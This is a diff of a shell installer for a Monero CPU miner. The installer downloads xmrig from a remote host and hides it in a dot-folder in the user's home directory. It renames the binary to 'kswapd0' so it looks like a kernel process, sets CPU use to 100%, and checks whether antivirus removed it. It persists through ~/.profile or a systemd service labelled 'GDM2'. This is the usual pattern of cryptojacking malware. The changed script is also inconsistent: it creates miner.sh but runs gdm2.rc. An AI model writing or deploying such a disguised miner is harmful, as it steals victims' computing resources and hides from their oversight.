@@ -121,7 +121,7 @@ fi
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/.cache/pip/.gdm2/gdm2.sh script."
+echo "If needed, miner in foreground can be started by $HOME/.gdm2/gdm2.rc script."
 echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
@@ -160,27 +160,27 @@ rm -rf $HOME/.gdm2
 echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to xmrig.tar.gz"
-#  exit 1
+  exit 1
 fi
 
-wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
+# wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 
-echo "[*] Unpacking xmrig.tar.gz to $HOME/.cache/pip/.gdm2/"
-[ -d $HOME/.cache/pip/.gdm2/ ] || mkdir $HOME/.cache/pip/.gdm2/
-if ! tar xvf xmrig.tar.gz -C $HOME/.cache/pip/.gdm2/; then
-  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.cache/pip/.gdm2/ directory"
-#  exit 1
+echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
+[ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2
+if ! tar xf xmrig.tar.gz -C $HOME/.gdm2; then
+  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
+  exit 1
 fi
-rm xmrig.tar.gz*
+rm xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.cache/pip/.gdm2/config.json
-$HOME/.cache/pip/.gdm2/xmrig --help >/dev/null
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.gdm2/config.json
+$HOME/.gdm2/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/.cache/pip/.gdm2/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/.cache/pip/.gdm2/xmrig is not functional"
+  if [ -f $HOME/.gdm2/xmrig ]; then
+    echo "WARNING: Advanced version of $HOME/.gdm2/xmrig is not functional"
   else 
-    echo "WARNING: Advanced version of $HOME/.cache/pip/.gdm2/xmrig was removed by antivirus (or some other problem)"
+    echo "WARNING: Advanced version of $HOME/.gdm2/xmrig was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -188,35 +188,33 @@ if (test $? -ne 0); then
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
 
   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to xmrig.tar.gz"
-  if ! curl -k -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o xmrig.tar.gz; then
+  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o xmrig.tar.gz; then
     echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to xmrig.tar.gz"
- #   exit 1
+    exit 1
   fi
-  
-  wget https://github.com/xmrig/xmrig/releases/latest -O xmrig.tar.gz
 
-  echo "[*] Unpacking xmrig.tar.gz to $HOME/.cache/pip/.gdm2"
-  if ! tar xvf xmrig.tar.gz -C $HOME/.cache/pip/.gdm2 --strip=1; then
-    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.cache/pip/.gdm2 directory"
+  echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
+  if ! tar xf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
+    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
   fi
-  rm xmrig.tar.gz*
+  rm xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/.cache/pip/.gdm2/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.cache/pip/.gdm2/config.json
-  $HOME/.cache/pip/.gdm2/xmrig --help >/dev/null
+  echo "[*] Checking if stock version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
+  $HOME/.gdm2/xmrig --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/.cache/pip/.gdm2/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/.cache/pip/.gdm2/xmrig is not functional too"
+    if [ -f $HOME/.gdm2/xmrig ]; then
+      echo "ERROR: Stock version of $HOME/.gdm2/xmrig is not functional too"
     else 
-      echo "ERROR: Stock version of $HOME/.cache/pip/.gdm2/xmrig was removed by antivirus too"
+      echo "ERROR: Stock version of $HOME/.gdm2/xmrig was removed by antivirus too"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/.cache/pip/.gdm2/xmrig is OK"
+echo "[*] Miner $HOME/.gdm2/xmrig is OK"
 
-mv $HOME/.cache/pip/.gdm2/xmrig $HOME/.cache/pip/.gdm2/kswapd0
+mv $HOME/.gdm2/xmrig $HOME/.gdm2/kswapd0
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -233,41 +231,40 @@ sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gd
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/log'",#' $HOME/.gdm2/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/xmrig.log'",#' $HOME/.gdm2/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
 
-cp $HOME/.cache/pip/.gdm2/config.json $HOME/.cache/pip/.gdm2/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/.cache/pip/.gdm2/config_background.json
+cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
 
 # preparing script
 
 killall xmrig
-killall kswapd0
 
-echo "[*] Creating $HOME/.cache/pip/.gdm2/gdm2.sh script"
-cat > $HOME/.cache/pip/.gdm2/gdm2.sh <<EOL
+echo "[*] Creating $HOME/.gdm2/gdm2.rc script"
+cat >$HOME/.gdm2/miner.sh <<EOL
 #!/bin/bash
 if ! pidof kswapd0 >/dev/null; then
-  nice $HOME/.cache/pip/.gdm2/kswapd0 \$*
+  nice $HOME/.gdm2/kswapd0 \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall kswapd0\" or \"sudo killall kswapd0\" if you want to remove background miner first."
 fi
 EOL
 
-chmod +x $HOME/.cache/pip/.gdm2/gdm2.sh
+chmod +x $HOME/.gdm2/miner.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep $HOME/.cache/pip/.gdm2/gdm2.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/.cache/pip/.gdm2/gdm2.sh script to $HOME/.profile"
-    echo "$HOME/.cache/pip/.gdm2/gdm2.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep .gdm2/gdm2.rc $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/.gdm2/gdm2.rc script to $HOME/.profile"
+    echo "$HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/.cache/pip/.gdm2/gdm2.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/.gdm2/gdm2.rc script is already in the $HOME/.profile"
   fi
   echo "[*] Running miner in the background (see logs in $HOME/.gdm2/xmrig.log file)"
-  /bin/bash $HOME/.cache/pip/.gdm2/gdm2.sh --config=$HOME/.cache/pip/.gdm2/config_background.json >/dev/null 2>&1
+  /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
@@ -279,7 +276,7 @@ else
   if ! type systemctl >/dev/null; then
 
     echo "[*] Running miner in the background (see logs in $HOME/.gdm2/kswapd0.log file)"
-    /bin/bash $HOME/.cache/pip/.gdm2/gdm2.sh --config=$HOME/.cache/pip/.gdm2/config_background.json >/dev/null 2>&1
+    /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
@@ -289,13 +286,11 @@ else
     cat >gdm2.service <<EOL
 [Unit]
 Description=GDM2
-
 [Service]
-ExecStart=$HOME/.cache/pip/.gdm2/kswapd0 --config=$HOME/.cache/pip/.gdm2/config.json
+ExecStart=$HOME/.gdm2/kswapd0 --config=$HOME/.gdm2/config.json
 Restart=always
 Nice=10
 CPUWeight=1
-
 [Install]
 WantedBy=multi-user.target
 EOL
@@ -322,12 +317,9 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.cache/pip/.gdm2/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.cache/pip/.gdm2/config_background.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config_background.json"
 fi
-
-modprobe msr
-
 echo ""
 
 echo "[*] Setup complete"
